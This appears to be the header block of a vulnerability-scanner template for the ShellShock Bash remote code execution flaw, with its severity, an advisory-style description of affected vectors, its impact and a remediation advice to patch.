info:
  name: ShellShock - Remote Code Execution
  author: pentest_swissky,0xelkomy
  severity: critical
  description: GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka ShellShock.
  impact: |
    Remote code execution can lead to unauthorized access, data theft, and system compromise.
  remediation: |
    Apply the necessary patches and updates provided by the vendor to fix the vulnerability.
